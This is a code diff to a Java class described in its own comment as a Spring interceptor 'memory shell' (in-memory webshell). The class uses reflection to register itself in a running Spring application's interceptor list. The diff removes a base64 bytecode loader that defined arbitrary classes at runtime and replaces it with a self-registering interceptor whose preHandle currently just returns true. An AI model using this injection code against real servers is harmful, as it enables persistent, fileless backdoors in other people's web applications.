@@ -4,20 +4,18 @@ import org.springframework.beans.BeansException;
 import org.springframework.web.context.WebApplicationContext;
 import org.springframework.web.context.request.RequestContextHolder;
 import org.springframework.web.context.request.ServletRequestAttributes;
+import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
 
 import javax.servlet.ServletRequest;
 import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 import java.lang.reflect.Method;
 
 /**
  * Spring Interceptor型 内存马
  * @author nu1r
  */
-public class SpringInterceptorMS {
-
-    static String b64;
-
-    static String clazzName;
+public class SpringInterceptorMS extends HandlerInterceptorAdapter {
 
     static {
         try {
@@ -47,33 +45,14 @@ public class SpringInterceptorMS {
             field.setAccessible(true);
             java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);
 
-            // 加载 SpringInterceptorTemplate 类的字节码
-            byte[]                   bytes       = base64Decode(b64);
-            java.lang.ClassLoader    classLoader = Thread.currentThread().getContextClassLoader();
-            java.lang.reflect.Method m0          = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
-            m0.setAccessible(true);
-            m0.invoke(classLoader, clazzName, bytes, 0, bytes.length);
             //添加SpringInterceptorTemplate类到adaptedInterceptors
-            adaptedInterceptors.add(classLoader.loadClass(clazzName).newInstance());
+            adaptedInterceptors.add(new SpringInterceptorMS());
         } catch (Exception ignored) {
         }
     }
 
-    public static byte[] base64Decode(String bs) throws Exception {
-        Class  base64;
-        byte[] value = null;
-        try {
-            base64 = Class.forName("java.util.Base64");
-            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
-            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
-        } catch (Exception e) {
-            try {
-                base64 = Class.forName("sun.misc.BASE64Decoder");
-                Object decoder = base64.newInstance();
-                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
-            } catch (Exception e2) {
-            }
-        }
-        return value;
+    @Override
+    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+        return true;
     }
 }
